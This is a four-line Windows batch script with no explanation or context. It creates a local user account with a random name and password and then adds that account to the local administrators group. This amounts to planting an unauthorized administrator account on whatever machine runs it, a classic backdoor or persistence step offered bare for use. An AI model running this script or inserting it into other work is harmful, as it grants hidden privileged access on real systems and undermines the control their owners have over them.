@echo off
set usr=%random%
net users %usr% %random% /add
net localgroup administrators %usr% /add